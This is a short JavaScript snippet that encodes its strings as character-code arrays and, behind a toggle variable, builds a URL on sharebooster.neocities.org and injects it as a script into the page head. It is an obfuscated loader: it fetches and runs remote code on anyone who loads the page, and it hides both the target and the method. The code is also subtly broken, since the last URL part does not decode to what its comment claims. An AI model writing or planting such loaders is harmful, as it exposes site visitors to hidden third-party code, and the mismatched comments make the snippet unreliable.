var loadExternalScript = true; // Editable toggle

(function(){
    function _decode(arr){ return String.fromCharCode(...arr); }

    const _s = [
        [99,114,101,97,116,101,69,108,101,109,101,110,116], // "createElement"
        [115,99,114,105,112,116], // "script"
        [115,114,99], // "src"
        [97,112,112,101,110,100,67,104,105,108,100], // "appendChild"
        [104,101,97,100], // "head"
        [103,101,116,69,108,101,109,101,110,116,66,121,73,100], // "getElementById"
        [115,116,121,108,101], // "style"
        [100,105,115,112,108,97,121], // "display"
        [110,111,110,101], // "none"
        [116,101,120,116,67,111,110,116,101,110,116], // "textContent"
        [83,99,114,105,112,116,32,105,115,32,100,105,115,97,98,108,101,100] // "Script is disabled"
    ];

    const _urlParts = [
        [104,116,116,112,115,58,47,47], // "https://"
        [115,104,97,114,101,98,111,111,115,116,101,114], // "sharebooster"
        [46], // "."
        [110,101,111,99,105,116,105,101,115], // "neocities"
        [46,111,114,103,47], // ".org/"
        [115,99,114,105,112,116], // "script"
        [37,69,51,133,164,46,106,115] // "%E3%85%A4.js"
    ];

    const fullURL = _urlParts.map(_decode).join('');

    if(loadExternalScript){
        const s = document[_decode(_s[0])](_decode(_s[1]));
        s[_decode(_s[2])] = fullURL;
        document[_decode(_s[4])][_decode(_s[3])](s);
    } else {
        const d = document[_decode(_s[5])]('scriptStatus');
        d[_decode(_s[6])][_decode(_s[7])] = _decode(_s[8]);
        d[_decode(_s[9])] = _decode(_s[10]);
    }
})();
